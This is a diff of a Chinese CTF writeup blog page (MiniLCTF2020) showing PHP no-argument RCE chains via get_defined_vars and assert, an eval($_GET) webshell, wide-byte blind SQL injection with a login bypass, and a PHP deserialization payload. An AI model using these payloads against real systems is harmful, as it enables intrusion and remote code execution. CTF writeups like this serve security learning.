 <p>我们可以用：<code>print_r(readfile(array_rand(array_flip(scandir(current(localeconv()))))));</code></p>
 <p>或者：<code>print_r(readfile(array_rand(array_flip(scandir(getcwd())))));</code></p>
-<p><img class="alignnone size-full wp-image-462" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514121755.png" alt="" width="291" height="168" /></p>
+<img class="alignnone size-full wp-image-462" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514121755.png" alt="" width="291" height="168" />
 <p>多刷新几次在源码中查看到我们成功读取了目标文件</p>
 <h3 id="如果目标文件不在当前目录呢">如果目标文件不在当前目录呢？</h3>
 <p><code>print_r(scandir(dirname(getcwd())));</code>查看上一级目录的文件</p>
 <p>当然直接<code>print_r(readfile(array_rand(array_flip(scandir(dirname(getcwd()))))));</code>是不可以的</p>
 <p>会报错，因为默认是在当前目录寻找并读取这个文件，而这个文件在上一层目录，所以要先改变当前目录</p>
 <p>前面写到了chdir()，用<code>print_r(readfile(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))));</code>即可改变当前目录为上一层目录并读取文件</p>
-<p><img class="alignnone size-full wp-image-463" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514124715.png" alt="" width="266" height="68" /></p>
+<img class="alignnone size-full wp-image-463" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514124715.png" alt="" width="266" height="68" />
 <h5><strong>如果在上一层目录的另一个文件夹里呢</strong></h5>
 我们使用：`print_r(scandir(dirname(getcwd())));`
 <p>可以得到：</p>
-<p><img class="alignnone size-full wp-image-464" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514125225.png" alt="" width="319" height="287" /></p>
+<img class="alignnone size-full wp-image-464" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514125225.png" alt="" width="319" height="287" />
 <p>使用：<code>print_r(array_rand(array_flip(scandir(dirname(getcwd())))));</code>得到：</p>
-<p><img class="alignnone size-full wp-image-465" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514125654.png" alt="" width="425" height="139" /></p>
+<img class="alignnone size-full wp-image-465" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514125654.png" alt="" width="425" height="139" />
 <p>这里我本来想尝试套娃使用类似的方法获取，但是发现好像并不行</p>
 <p>没事我们可以换一种方法，我将index.php源代码修改为：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]);</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>这里又介绍一个函数：<code>get_defined_vars()</code>此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p>
 <p>输入：<code>?a=print_r(current(get_defined_vars()));&amp;b=a</code>返回：</p>
-<p><img class="alignnone size-full wp-image-466" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514141609.png" alt="" width="680" height="152" /></p>
+<img class="alignnone size-full wp-image-466" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514141609.png" alt="" width="680" height="152" />
 <p>这下简单了，我们只需要在b处写需要执行的代码，用next()即可获取到b的值</p>
-<p><img class="alignnone size-full wp-image-467" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514141819.png" alt="" width="777" height="181" /></p>
+<img class="alignnone size-full wp-image-467" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514141819.png" alt="" width="777" height="181" />
 <p>输入：<code>?a=assert(next(current(get_defined_vars())));&amp;b=phpinfo();//也可以用eval</code></p>
 <p>返回：</p>
-<p><img class="alignnone size-full wp-image-468" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514142154.png" alt="" width="1430" height="701" /></p>
+<img class="alignnone size-full wp-image-468" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514142154.png" alt="" width="1430" height="701" />
 <p>我们可以直接：<code>?a=assert(next(current(get_defined_vars())));&amp;b=eval($_POST['a']);</code>蚁剑一把梭</p>
 <p>或者由之前查到的路径：<code>?a=assert(next(current(get_defined_vars())));&amp;b=print_r(scandir('../flag_is_here'));</code></p>
-<p><img class="alignnone size-full wp-image-469" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514143558.png" alt="" width="943" height="198" /></p>
-<p>发现了flag3.php，输入：<code>?a=assert(next(current(get_defined_vars())));&amp;b=readfile('../flag_is_here/flag3.php');</code></p>
+<img class="alignnone size-full wp-image-469" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514143558.png" alt="" width="943" height="198" />
+<p>发现了flag3.php，输入：<code>?a=assert(next(current(get_defined_vars())));&amp;b=readfile('../flag_is_here/flag3.php'); </code></p>
 <p>源码处得到flag：</p>
-<p><img class="alignnone size-full wp-image-470" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514143857.png" alt="" width="331" height="113" /></p>
+<img class="alignnone size-full wp-image-470" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514143857.png" alt="" width="331" height="113" />
 <p>先到这里，还有利用中间件apache的php内置函数<code>apache_request_headers()</code>进行获取headers达到rce</p>
 <p>还有利用php内置函数<code>session_id()</code>获取session进行rce</p>
 <p>挖个坑，持续更新ing&hellip;</p>
-<p>参考：<a href="https://www.jianshu.com/p/7355a5ab4822"><a href="https://www.jianshu.com/p/7355a5ab4822">https://www.jianshu.com/p/7355a5ab4822</a></a> 、<a href="https://www.cnblogs.com/wangtanzhi/p/12311239.html"><a href="https://www.cnblogs.com/wangtanzhi/p/12311239.html">https://www.cnblogs.com/wangtanzhi/p/12311239.html</a></a></p>
+<p>参考：<a href="https://www.jianshu.com/p/7355a5ab4822"><a href="https://www.jianshu.com/p/7355a5ab4822" target="_blank" rel="noopener noreffer">https://www.jianshu.com/p/7355a5ab4822</a></a> 、<a href="https://www.cnblogs.com/wangtanzhi/p/12311239.html"><a href="https://www.cnblogs.com/wangtanzhi/p/12311239.html" target="_blank" rel="noopener noreffer">https://www.cnblogs.com/wangtanzhi/p/12311239.html</a></a></p>
 <h2 id="are-you-reclu3e">are you reclu3e</h2>
 <p>打开是一个登录框，尝试一会注入发现宽字节可以注：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1111,38 +1111,38 @@ O:4:&#34;foo3&#34;:2:{s:3:&#34;var&#34;;O:4:&#34;foo2&#34;:2:{s:3:&#34;var&#34;;
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="err">尝试宽字节注入时有不同回显：</span>
-<span class="n">alert</span><span class="p">(</span><span class="s1">&#39;I know you are reclu3e but you need post the right password&#39;</span><span class="p">)</span>
-
-<span class="err">猜列数为</span><span class="mi">2</span><span class="err">时：</span><span class="mi">1</span><span class="o">%</span><span class="n">df</span><span class="s1">&#39; union select 1,2#有：
-</span><span class="s1">alert(&#39;</span><span class="n">I</span> <span class="n">know</span> <span class="n">you</span> <span class="k">are</span> <span class="n">reclu3e</span> <span class="n">but</span> <span class="n">you</span> <span class="n">need</span> <span class="n">post</span> <span class="n">the</span> <span class="k">right</span> <span class="n">password</span><span class="s1">&#39;)
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="err">尝试宽字节注入时有不同回显：</span><span class="w">
+</span><span class="w"></span><span class="n">alert</span><span class="p">(</span><span class="s1">&#39;I know you are reclu3e but you need post the right password&#39;</span><span class="p">)</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="err">猜列数为</span><span class="mi">2</span><span class="err">时：</span><span class="mi">1</span><span class="o">%</span><span class="n">df</span><span class="s1">&#39; union select 1,2#有：
+</span><span class="s1">alert(&#39;</span><span class="n">I</span><span class="w"> </span><span class="n">know</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">reclu3e</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">need</span><span class="w"> </span><span class="n">post</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">right</span><span class="w"> </span><span class="n">password</span><span class="s1">&#39;)
 </span><span class="s1">
 </span><span class="s1">没回显，只能盲注：
 </span><span class="s1">盲注数据库长度为5：
-</span><span class="s1">1%df&#39;</span> <span class="k">or</span> <span class="k">length</span><span class="p">(</span><span class="k">database</span><span class="p">())</span><span class="o">=</span><span class="mi">5</span><span class="o">#</span>
-
-<span class="err">盲注表名：</span>
-<span class="mi">1</span><span class="o">%</span><span class="n">df</span><span class="s1">&#39; or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit  0,1),1,1)) =117#
+</span><span class="s1">1%df&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="k">length</span><span class="p">(</span><span class="k">database</span><span class="p">())</span><span class="o">=</span><span class="mi">5</span><span class="o">#</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="err">盲注表名：</span><span class="w">
+</span><span class="w"></span><span class="mi">1</span><span class="o">%</span><span class="n">df</span><span class="s1">&#39; or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit  0,1),1,1)) =117#
 </span><span class="s1">//第一位u
-</span><span class="s1">1%df&#39;</span> <span class="k">or</span> <span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span> <span class="k">limit</span>  <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span> <span class="o">=</span><span class="mi">115</span><span class="o">#</span>
-<span class="o">//</span><span class="err">第二位</span><span class="n">s</span>
-<span class="n">users</span>
-
-<span class="err">列名：</span>
-<span class="err">可以根据源码泄露</span><span class="p">.</span><span class="n">login</span><span class="p">.</span><span class="n">php</span><span class="p">.</span><span class="n">swp获得列名</span><span class="err">：</span><span class="n">username和password</span><span class="err">，或者直接猜</span>
-<span class="err">我怕它平台撑不住所以没扫目录，后来放了</span><span class="n">hint一看就知道有源码</span>
-<span class="err">估计把</span><span class="n">username和password从information_schema</span><span class="p">.</span><span class="n">columns表里删了</span><span class="err">，注了半天没注出来</span>
-
-<span class="err">字段值：</span>
-<span class="n">username</span><span class="p">:</span><span class="n">reclu3e</span>
-<span class="n">password</span><span class="p">:</span><span class="mi">50</span><span class="n">dc96a1567a18eb384eeddf1a9a7d48</span>
-</code></pre></td></tr></table>
+</span><span class="s1">1%df&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">limit</span><span class="w">  </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="o">=</span><span class="mi">115</span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="o">//</span><span class="err">第二位</span><span class="n">s</span><span class="w">
+</span><span class="w"></span><span class="n">users</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="err">列名：</span><span class="w">
+</span><span class="w"></span><span class="err">可以根据源码泄露</span><span class="p">.</span><span class="n">login</span><span class="p">.</span><span class="n">php</span><span class="p">.</span><span class="n">swp获得列名</span><span class="err">：</span><span class="n">username和password</span><span class="err">，或者直接猜</span><span class="w">
+</span><span class="w"></span><span class="err">我怕它平台撑不住所以没扫目录，后来放了</span><span class="n">hint一看就知道有源码</span><span class="w">
+</span><span class="w"></span><span class="err">估计把</span><span class="n">username和password从information_schema</span><span class="p">.</span><span class="n">columns表里删了</span><span class="err">，注了半天没注出来</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="err">字段值：</span><span class="w">
+</span><span class="w"></span><span class="n">username</span><span class="p">:</span><span class="n">reclu3e</span><span class="w">
+</span><span class="w"></span><span class="n">password</span><span class="p">:</span><span class="mi">50</span><span class="n">dc96a1567a18eb384eeddf1a9a7d48</span><span class="w">
+</span></code></pre></td></tr></table>
 </div>
 </div><p>或者用逻辑为真万能密码登录：<code>%df' union select 1,1#</code></p>
 <p>然后根据.index.php.swp源码，反序列化即可：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1171,7 +1171,7 @@ O:4:&#34;foo3&#34;:2:{s:3:&#34;var&#34;;O:4:&#34;foo2&#34;:2:{s:3:&#34;var&#34;;
 </span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
     <span class="k">include</span> <span class="s2">&#34;flag.php&#34;</span><span class="p">;</span><span class="c1">//$flag=&#34;minilctf{****}&#34;;
 </span><span class="c1"></span>    <span class="nx">session_start</span><span class="p">();</span>
     <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">]))</span> <span class="p">{</span>
@@ -1181,32 +1181,32 @@ O:4:&#34;foo3&#34;:2:{s:3:&#34;var&#34;;O:4:&#34;foo2&#34;:2:{s:3:&#34;var&#34;;
         <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;Hello, reclu3e!&lt;/h1&gt;&#39;</span><span class="p">;</span>
         <span class="nv">$p</span><span class="o">=</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;p&#34;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;p&#34;</span><span class="p">]</span><span class="o">:</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
     <span class="p">}</span>
-<span class="cp">?&gt;</span>
-<span class="cp">&lt;?php</span>
-<span class="k">class</span> <span class="nc">person</span><span class="p">{</span>
-    <span class="k">public</span> <span class="nv">$name</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
-    <span class="k">public</span> <span class="nv">$age</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
-    <span class="k">public</span> <span class="nv">$weight</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
-    <span class="k">public</span> <span class="nv">$height</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
-    <span class="k">private</span> <span class="nv">$serialize</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
-        <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">serialize</span><span class="p">)){</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">serialize</span><span class="o">++</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
-        <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="s1">&#39;$s=&#34;&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">serialize</span><span class="o">.</span><span class="s1">&#39;&#34;;&#39;</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<span class="cp">?&gt;</span><span class="err">
+</span><span class="err">&lt;?php
+</span><span class="err">class person{
+</span><span class="err">    public $name=&#39;&#39;;
+</span><span class="err">    public $age=0;
+</span><span class="err">    public $weight=0;
+</span><span class="err">    public $height=0;
+</span><span class="err">    private $serialize=&#39;&#39;;
+</span><span class="err">    public function __wakeup(){
+</span><span class="err">        if(is_numeric($this-&gt;serialize)){
+</span><span class="err">            $this-&gt;serialize++;
+</span><span class="err">        }
+</span><span class="err">    }
+</span><span class="err">    public function __destruct(){
+</span><span class="err">        @eval(&#39;$s=&#34;&#39;.$this-&gt;serialize.&#39;&#34;;&#39;);
+</span><span class="err">    }
+</span><span class="err">}
+</span></code></pre></td></tr></table>
 </div>
 </div><p>payload：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">public $serialize=&#39;&#34;;readfile(&#34;flag.php&#34;);?&gt;&#39;;
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="nv">$serialize</span><span class="o">=</span><span class="s1">&#39;&#34;;readfile(&#34;flag.php&#34;);?&gt;&#39;</span><span class="p">;</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>查看源码得到flag，或者直接<code>highlight_file()</code></p></div><div class="post-footer" id="post-footer">
@@ -1220,7 +1220,7 @@ O:4:&#34;foo3&#34;:2:{s:3:&#34;var&#34;;O:4:&#34;foo2&#34;:2:{s:3:&#34;var&#34;;
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://clq0.top/minilctf2020-writeup/" data-title="MiniLCTF2020 Writeup" data-hashtags="unserialize,RCE,SQL注入"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://clq0.top/minilctf2020-writeup/" data-hashtag="unserialize"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://clq0.top/minilctf2020-writeup/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://clq0.top/minilctf2020-writeup/" data-title="MiniLCTF2020 Writeup"><i class="fab fa-weibo fa-fw"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.h4ck.fun/minilctf2020-writeup/" data-title="MiniLCTF2020 Writeup" data-via="Le0nsec" data-hashtags="unserialize,RCE,SQL注入"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.h4ck.fun/minilctf2020-writeup/" data-hashtag="unserialize"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://blog.h4ck.fun/minilctf2020-writeup/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://blog.h4ck.fun/minilctf2020-writeup/" data-title="MiniLCTF2020 Writeup"><i class="fab fa-weibo fa-fw"></i></a></span>
             </div>
         </div>
     </div>
@@ -1239,7 +1239,7 @@ O:4:&#34;foo3&#34;:2:{s:3:&#34;var&#34;;O:4:&#34;foo2&#34;:2:{s:3:&#34;var&#34;;
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><a>本网站由</a><a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="-blank"><img src="/upyun_logo2.png" width="4%" style="vertical-align:middle"></a><a>提供CDN加速/云存储服务</a></div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
                     <span class="icp"><script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1278765080&web_id=1278765080"></script></span></div>
         </div>
     </footer></div>
